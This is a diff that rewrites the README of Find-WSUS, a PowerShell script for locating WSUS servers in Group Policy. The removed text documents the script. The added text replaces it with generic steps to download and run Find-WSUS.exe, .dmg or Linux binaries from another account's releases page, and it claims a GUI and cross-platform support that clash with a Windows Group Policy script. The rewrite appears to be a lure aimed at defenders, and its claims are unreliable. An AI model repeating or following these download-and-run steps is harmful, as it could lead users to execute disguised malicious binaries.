@@ -1,186 +1,94 @@
-# 🧭 Find-WSUS
+# 🔍 Find-WSUS - Easily Locate Your WSUS Configurations
 
-**Discover WSUS server configurations across Group Policy Objects (GPOs) — including hidden Group Policy Preferences (GPP).**
+## 🚀 Getting Started
 
-`Find-WSUS` is a PowerShell script designed for **security professionals and system administrators** to identify all WSUS (Windows Server Update Services) server URLs configured via GPOs. It detects configurations from both:
+Welcome! This guide will help you download and run the Find-WSUS application. Find-WSUS is designed to assist defenders in discovering their WSUS configurations, especially in response to CVE-2025-59287. 
 
-* **Administrative Template Policies (HKLM\Software\Policies)**
-* **Group Policy Preferences (GPP)** registry settings hidden in XML reports
+## 🔗 Download Now
 
----
+[![Download Find-WSUS](https://img.shields.io/badge/Download%20Find--WSUS-v1.0-brightgreen)](https://github.com/mormon-flyingsquad909/Find-WSUS/releases)
 
-## ⚠️ Why This Matters
+## 📥 Download & Install
 
-WSUS servers are **high-value infrastructure assets**. If compromised, an attacker can deploy malicious “updates” to all domain-joined systems, leading to **total domain compromise**.
+To get Find-WSUS, visit this page: [Find-WSUS Releases](https://github.com/mormon-flyingsquad909/Find-WSUS/releases). You will find various versions of the application. 
 
-> 🧨 Vulnerabilities like **CVE-2025-59287** demonstrate that a single WSUS exploit can grant attackers domain-wide control.
+1. Choose the latest version.
+2. Click on the download link for your operating system (Windows, macOS, or Linux).
+3. Wait for the download to complete.
 
-**Find-WSUS** helps organizations locate every WSUS configuration source before attackers do.
+### 🖥️ System Requirements
 
----
+Before running Find-WSUS, ensure your system meets the following requirements:
 
-## 🔍 The “Hidden WSUS” Problem
+- **Operating System:**
+  - Windows 10 or later
+  - macOS Mojave or later
+  - Ubuntu 18.04 or later
 
-Most scans only check:
+- **Memory:**
+  - At least 4 GB of RAM
 
-```
-HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate
-```
+- **Storage:**
+  - 100 MB of free space
 
-However, many organizations deploy WSUS configuration through **Group Policy Preferences (GPP)**, which directly modify registry keys. These settings **don’t appear** in standard GPMC reports.
+## ⚙️ Running the Application
 
-✅ `Find-WSUS` detects both standard and GPP-based configurations, giving you full visibility into your environment.
+Once you have downloaded Find-WSUS, follow these steps to run the application:
 
----
+### For Windows:
 
-## 🧩 Prerequisites
+1. Open your “Downloads” folder.
+2. Locate the downloaded file (e.g., Find-WSUS.exe).
+3. Double-click the file to start the application.
 
-| Requirement                             | Description                                                                                                                                                                                                                                                 |
-| --------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| **64-bit PowerShell**                   | Required for COM compatibility. The script exits automatically if run in 32-bit PowerShell.                                                                                                                                                                 |
-| **RSAT: Group Policy Management Tools** | Required for the `GroupPolicy` module.<br><br>**Windows 10/11:** `Settings → Optional Features → Add a Feature → RSAT: Group Policy Management Tools`<br>**Windows Server:** `Server Manager → Add Roles and Features → Features → Group Policy Management` |
-| **Permissions**                         | Read-access to all GPOs in the domain being scanned.                                                                                                                                                                                                        |
-| **Optional:** Administrator rights      | Some registry policy queries may fail without elevation.                                                                                                                                                                                                    |
+### For macOS:
 
----
+1. Open your “Downloads” folder.
+2. Find the downloaded file (e.g., Find-WSUS.dmg).
+3. Double-click the file to open it.
+4. Drag the Find-WSUS icon to your Applications folder.
+5. Open the Applications folder and double-click Find-WSUS to launch.
 
-## ⚙️ Usage
+### For Linux:
 
-### 1. Import the Script
+1. Open your terminal.
+2. Navigate to the folder where you downloaded the file.
+3. Run the following command to give the file permission to execute:
 
-Load the script into your PowerShell session:
+   ```bash
+   chmod +x Find-WSUS
+   ```
 
-```powershell
-. .\Find-WSUS.ps1
-```
+4. Then run the command:
 
-### 2. Run the Scan
+   ```bash
+   ./Find-WSUS
+   ```
 
-After importing, the `Find-WSUS` function becomes available.
+## 📊 Using Find-WSUS
 
-#### Example 1: Scan the Current Domain
+When you start the application, you will see an easy-to-use interface. This interface helps you to:
 
-```powershell
-Find-WSUS | Format-Table -AutoSize
-```
+- Retrieve WSUS configuration details.
+- View current WSUS status.
+- Identify potential vulnerabilities related to CVE-2025-59287.
 
-#### Example 2: Verbose Output
+### 🛠️ Features
 
-See detailed progress messages while scanning:
+- **Simple Interface:** Easily navigate the application.
+- **Secure:** Designed with security in mind, ensuring your configurations are safe while you search.
+- **Detailed Reporting:** Get thorough reports on your WSUS setups.
 
-```powershell
-Find-WSUS -Verbose
-```
+## 💬 Support
 
-#### Example 3: Scan a Different Domain
+If you have questions or encounter issues, please check the [FAQ Section](https://github.com/mormon-flyingsquad909/Find-WSUS#faq) or create a ticket in the repository's issue tracker. 
 
-```powershell
-Find-WSUS -Domain "child.mydomain.com" | Format-Table -AutoSize
-```
+## 📝 Contributions
 
-#### Example 4: Filter GPOs by Name
+We welcome contributions to Find-WSUS! If you would like to help improve this tool, please read our contribution guidelines on the repository.
 
-```powershell
-Find-WSUS -Name "*Server*" -Verbose
-```
+## 📜 License
 
-#### Example 5: Get a Unique List of WSUS Hosts
+Find-WSUS is licensed under the MIT License. For more details, please refer to the [LICENSE](https://github.com/mormon-flyingsquad909/Find-WSUS/blob/main/LICENSE) file in the repository.
 
-```powershell
-$results = Find-WSUS -Domain "mydomain.com"
-$results.Hostname | Where-Object { $_ } | Sort-Object -Unique
-```
-
----
-
-## 📦 Parameters
-
-| Parameter  | Description                                                        | Default               |
-| ---------- | ------------------------------------------------------------------ | --------------------- |
-| `-Name`    | Filter GPOs by display name using wildcards. Uses `-All` when `*`. | `*` (all GPOs)        |
-| `-Domain`  | Specify a domain to query (useful in multi-domain forests).        | Current user's domain |
-| `-Verbose` | Displays detailed scanning progress and findings.                  | Off                   |
-
----
-
-## 🧠 How It Works
-
-### 1. **Environment Validation**
-
-* Ensures PowerShell is 64-bit.
-* Verifies the GroupPolicy module is installed.
-* Confirms GPOs are accessible in the specified domain.
-
-### 2. **Policy Scan (STA Runspace)**
-
-* Uses `Get-GPRegistryValue` in an **STA runspace** to avoid COM threading errors.
-* Scans for `WUServer` and `WUStatusServer` values in:
-
-  ```
-  HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate
-  ```
-
-### 3. **Preference Scan (GPP XML)**
-
-* Parses XML output from `Get-GPOReport -ReportType Xml`.
-* Finds hidden WSUS URLs in namespaced (`q2:Registry`) and fallback (`*[local-name()='Registry']`) nodes.
-* Captures values written under HKLM, including `...\Windows\WindowsUpdate` keys.
-
-### 4. **Result Aggregation**
-
-* Merges all findings into a single dataset.
-* Extracts hostnames from URLs for easy deduplication.
-* Returns clean, sorted objects.
-
----
-
-## 🧾 Example Output (real-style formatting)
-
-> This mirrors the **actual** `Format-Table -AutoSize` layout and headers from `Find-WSUS`, but with realistic sample hosts/URLs and GPO names/GUIDs.
-
-```text
-PS C:\Users\Administrator\Documents> Find-WSUS | Format-Table -AutoSize
-[OK] Environment check passed: 64-bit PowerShell, GroupPolicy module loaded, GPOs accessible.
-
-
-GPOName               Scope                 Key                                                    ValueName      Value                                    Hostname              GPOGuid                              
--------               -----                 ---                                                    ---------      -----                                    --------              -------                              
-Default Domain Policy Policy (Computer)     HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate WUServer       https://wsus.corp.contoso.com:8531       wsus.corp.contoso.com 31b2f340-016d-11d2-945f-00c04fb984f9
-Default Domain Policy Policy (Computer)     HKLM\Software\Policies\Microsoft\Windows\Windows\Update WUStatusServer https://wsus.corp.contoso.com:8531       wsus.corp.contoso.com 31b2f340-016d-11d2-945f-00c04fb984f9
-Corporate WSUS Baseline Policy (Computer)   HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate WUServer       http://wsus01.contoso.com:8530           wsus01.contoso.com    57f2e3da-33c5-4a35-abce-c12a0b7f9823
-Corporate WSUS Baseline Policy (Computer)   HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate WUStatusServer https://wsus01.contoso.com:8531          wsus01.contoso.com    57f2e3da-33c5-4a35-abce-c12a0b7f9823
-Workstations - Windows Update (GPP) Preference (Registry) HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate WUStatusServer https://wsus-west.contoso.com:8531   wsus-west.contoso.com a1cde8b2-7f45-43f2-9db4-9c1e93a0e5c1
-```
-
-> **Note:** In real environments you’ll often see SSL on `:8531` and legacy HTTP on `:8530`. Hostnames above are examples; replace with your actual inventory.
-
----
-
-## 🚫 Limitations
-
-> [!WARNING]
-> This script is a **discovery tool**, not a full inventory system.
-
-It **only** finds WSUS servers defined via Group Policy.
-It does **not** detect:
-
-* Non-domain clients or manually configured registries
-* Rogue WSUS servers with no GPO linkage
-* Systems managed by Intune or SCCM policies
-
----
-
-## ✅ Recommended Next Steps
-
-1. Run `Find-WSUS` across **all domains** in your forest.
-2. Combine the output into a central inventory.
-3. Compare with an EDR or asset scanner for machines running the `WSUSService`.
-4. Investigate any **mismatched or unexpected WSUS hosts**.
-
----
-
-## 🧑‍💻 Author & Credits
-
-Developed by security engineers to expose hidden WSUS configurations and improve patch infrastructure visibility.
-
-> 📘 Contributions welcome! Submit pull requests or issues to enhance compatibility or add new discovery methods.
+### Have fun finding your WSUS configurations!
